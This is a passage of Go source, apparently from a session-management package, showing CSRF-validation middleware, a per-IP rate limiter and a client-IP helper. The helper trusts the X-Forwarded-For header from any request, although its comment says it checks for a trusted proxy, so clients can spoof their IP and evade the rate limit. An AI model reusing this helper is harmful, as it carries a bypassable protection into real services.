                http.Error(w, "unauthorized", http.StatusUnauthorized)
                return
            }

            // Token can be in header or form field
            token := r.Header.Get("X-CSRF-Token")
            if token == "" {
                token = r.FormValue("csrf_token")
            }

            if !sm.ValidateCSRF(sess, token) {
                http.Error(w, "CSRF validation failed", http.StatusForbidden)
                return
            }

            next.ServeHTTP(w, r)
        })
    }
}

// RateLimit provides per-IP rate limiting for session-related endpoints
func RateLimit(rate float64, burst int) func(http.Handler) http.Handler {
    limiters := &sync.Map{} // IP -> *rate.Limiter

    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            ip := getClientIP(r)

            lim, _ := limiters.LoadOrStore(ip, rate_pkg.NewLimiter(rate_pkg.Limit(rate), burst))
            limiter := lim.(*rate_pkg.Limiter)

            if !limiter.Allow() {
                w.Header().Set("Retry-After", "60")
                http.Error(w, "rate limit exceeded", http.StatusTooManyRequests)
                return
            }

            next.ServeHTTP(w, r)
        })
    }
}

// getClientIP extracts the real client IP considering proxies
func getClientIP(r *http.Request) string {
    // Trust X-Forwarded-For only if from trusted proxy
    if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
        // Take the leftmost IP (closest to client)
        ips := strings.Split(xff, ",")
        if len(ips) > 0 {
            return strings.TrimSpace(ips[0])
        }
    }
    ip, _, _ := net.SplitHostPort(r.RemoteAddr)
    return ip
}
```
